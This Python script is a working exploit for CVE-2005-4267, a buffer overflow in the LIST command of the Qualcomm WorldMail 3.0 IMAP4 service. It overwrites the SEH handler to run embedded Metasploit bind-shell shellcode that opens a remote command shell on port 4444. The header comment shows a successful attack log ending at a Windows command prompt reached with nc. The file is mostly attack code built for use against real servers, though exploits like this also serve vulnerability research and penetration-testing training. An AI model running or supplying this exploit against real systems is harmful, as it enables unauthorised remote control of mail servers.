#!/usr/bin/python
# Author: 		5M7X
# Date: 		04.2010
# CVE:			CVE-2005-4267
# Target: 		Qualcomm WorldMail v3.0 - IMAP4-Service
# Test-Plattform: 	WinXP SP3 german
# badchars:		\x00 = NULL, \x7b = {
# Type: 		SEH-Overwrite via Buffer-Overflow in LIST-Command
# Info:			http://www.securityfocus.com/bid/15980/info
#
# greetings to KMDave, corelanc0d3r, muts and the offsec-crowd
# badchar-detection: http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Dealing_with_badchars
# memjmp-ninjitsu: http://www.corelan.be:8800/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/
# asm-opcode-ref: http://ref.x86asm.net/coder32.html
#
# ----------------------------- example of a successfull attack
# root@bt exploitme> ./worldmail_exp_5M7X.py 192.168.178.25 143
#  Qualcomm WorldMail v3.0 - IMAP4-Service - LIST-SEH-Overwrite-BoF
#  5M7X 2010
#
# [x] connecting to target 192.168.178.25:143
# [x] sending evil buffer
# [x] attack finnished, try to connect to the remote-shell via nc 192.168.178.25 4444
# root@bt exploitme> 192.168.178.25 4444
# bash: 192.168.178.25: command not found
# root@bt exploitme> nc 192.168.178.25 4444
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\WINDOWS\system32>


import sys, struct, socket

# about 644 +- 2 byte for shellcode + 115 additional bytes could be reached via an extra jmp if necessary
shellcode = (
#./msfpayload windows/shell_bind_tcp R | ./msfencode -b '\x00\xff\x7b' -t c
#[*] x86/shikata_ga_nai succeeded with size 369 (iteration=1)
	"\xdb\xc9\xba\x90\x83\x22\x87\x29\xc9\xd9\x74\x24\xf4\x58\xb1"
	"\x56\x31\x50\x19\x03\x50\x19\x83\xe8\xfc\x72\x76\xde\x6f\xfb"
	"\x79\x1f\x70\x9b\xf0\xfa\x41\x89\x67\x8e\xf0\x1d\xe3\xc2\xf8"
	"\xd6\xa1\xf6\x8b\x9a\x6d\xf8\x3c\x10\x48\x37\xbc\x95\x54\x9b"
	"\x7e\xb4\x28\xe6\x52\x16\x10\x29\xa7\x57\x55\x54\x48\x05\x0e"
	"\x12\xfb\xb9\x3b\x66\xc0\xb8\xeb\xec\x78\xc2\x8e\x33\x0c\x78"
	"\x90\x63\xbd\xf7\xda\x9b\xb5\x5f\xfb\x9a\x1a\xbc\xc7\xd5\x17"
	"\x76\xb3\xe7\xf1\x47\x3c\xd6\x3d\x0b\x03\xd6\xb3\x52\x43\xd1"
	"\x2b\x21\xbf\x21\xd1\x31\x04\x5b\x0d\xb4\x99\xfb\xc6\x6e\x7a"
	"\xfd\x0b\xe8\x09\xf1\xe0\x7f\x55\x16\xf6\xac\xed\x22\x73\x53"
	"\x22\xa3\xc7\x77\xe6\xef\x9c\x16\xbf\x55\x72\x27\xdf\x32\x2b"
	"\x8d\xab\xd1\x38\xb7\xf1\xbd\x8d\x85\x09\x3e\x9a\x9e\x7a\x0c"
	"\x05\x34\x15\x3c\xce\x92\xe2\x43\xe5\x62\x7c\xba\x06\x92\x54"
	"\x79\x52\xc2\xce\xa8\xdb\x89\x0e\x54\x0e\x1d\x5f\xfa\xe1\xdd"
	"\x0f\xba\x51\xb5\x45\x35\x8d\xa5\x65\x9f\xb8\xe2\xab\xfb\xe8"
	"\x84\xc9\xfb\x1f\x08\x47\x1d\x75\xa0\x01\xb5\xe2\x02\x76\x0e"
	"\x94\x7d\x5c\x22\x0d\xe9\xe8\x2c\x89\x16\xe9\x7a\xb9\xbb\x41"
	"\xed\x4a\xd7\x55\x0c\x4d\xf2\xfd\x47\x75\x94\x74\x36\x37\x05"
	"\x88\x13\xaf\xa6\x1b\xf8\x30\xa1\x07\x57\x66\xe6\xf6\xae\xe2"
	"\x1a\xa0\x18\x11\xe7\x34\x62\x91\x33\x85\x6d\x1b\xb6\xb1\x49"
	"\x0b\x0e\x39\xd6\x7f\xde\x6c\x80\x29\x98\xc6\x62\x80\x72\xb4"
	"\x2c\x44\x03\xf6\xee\x12\x0c\xd3\x98\xfb\xbc\x8a\xdc\x04\x70"
	"\x5b\xe9\x7d\x6d\xfb\x16\x54\x36\x0b\x5d\xf5\x1e\x84\x38\x6f"
	"\x23\xc9\xba\x45\x67\xf4\x38\x6c\x17\x03\x20\x05\x12\x4f\xe6"
	"\xf5\x6e\xc0\x83\xf9\xdd\xe1\x81\xf0"
)

# SEH gets overwritten after 770bytes.. thats the place we should put our shellcode to
bufTriggerSEH = '\x90' * 770

# length of the nopsled in front of our shellcode
nsled = 16

# the buffer in front of the SEH-ptr which also contains a nopsled in front of our shellcode
bufPreSEH = bufTriggerSEH[:nsled] + shellcode + bufTriggerSEH[(nsled + len(shellcode)):]

# \xeb\x08 = jmp [addr + 08] (relative jmp 8 bytes forward from current position to jmp over ptrSEH into the pre-backjump-nopsled)
ptrNextSEH 	= '\xEB' + '\x08' + '\x90\x90'

# searched for pop pop ret via "!pvefindaddr p" and then just used one which is in the app and has no badchars
#Found pop eax -  pop esi -  ret at 0x016E4018 [msspiauth.dll] {PAGE_EXECUTE} #[SafeSEH: ** NO ** - ASLR : Unable to determine] - #C:\Programme\Qualcomm\Worldmail3\MSSPIAUTH.DLL
ptrSEH		= struct.pack('<L',0x016E4018)

# <-- we land here after poppopret and have about 82byte which is not much so
# we need a to jmp back 786 bytes into the nopsled of bufPreSEH to get into our shellcode
# -786 = FFFFFCEE *because of little endian we have to reverse/pack it*
bufPostSEH 	= '\xE9' + struct.pack('<L',0xFFFFFCEE)

# that is needed at least once to trigger the buffer-overflow
# only if the buffer ends with a } we are able to use it for an attack since the parser wont let it go through if not
bufTriggerExp	= '}' * 1

# built up our attack-buffer. on winxpsp3 german SEH/nSEH get overwritten after 770 byte
buffer = bufPreSEH + ptrNextSEH + ptrSEH + '\x90' * 16 + bufPostSEH + bufTriggerExp

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# banner
print " Qualcomm WorldMail v3.0 - IMAP4-Service - LIST-SEH-Overwrite-BoF\n 5M7X 2010\n"

# check the args and print usage
if (len(sys.argv[1:]) == 0):
	print "usage: " + sys.argv[0] + " target-ip port"
	sys.exit()

print "[x] connecting to target " + sys.argv[1] + ":" + sys.argv[2]

try:
	s.connect((sys.argv[1],int(sys.argv[2])))
except:
	print "[x] ERR! seems the target/port is not reachable"
	sys.exit()

data = s.recv(1024)

print "[x] sending evil buffer"

s.send('a001 LIST ' + buffer + '\r\n')

print "[x] attack finnished, try to connect to the remote-shell via nc " + sys.argv[1] + " 4444"

s.close()

# EOF
